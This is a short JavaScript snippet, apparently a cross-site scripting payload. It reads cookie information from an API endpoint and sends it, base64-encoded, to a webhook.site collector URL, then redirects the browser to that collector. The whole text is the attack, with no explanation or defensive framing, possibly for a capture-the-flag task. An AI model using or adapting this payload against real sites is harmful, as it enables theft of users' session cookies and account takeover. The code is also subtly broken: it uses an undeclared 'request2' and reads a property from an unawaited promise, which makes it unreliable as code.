let htmlText='';
const request=new XMLHttpRequest();
fetch('http://sflee.kro.kr:5555/api/v1/my_cookie_info').then(res => htmlText=res.json().cookies);
setTimeout(function(){
      request2.open('GET','https://webhook.site/0d7b605c-cf5d-4f71-97db-58d90cf41843/'+btoa(htmlText),false);
      request2.send();
      request2.close();
      location.href='https://webhook.site/0d7b605c-cf5d-4f71-97db-58d90cf41843/'+request.response},1000);
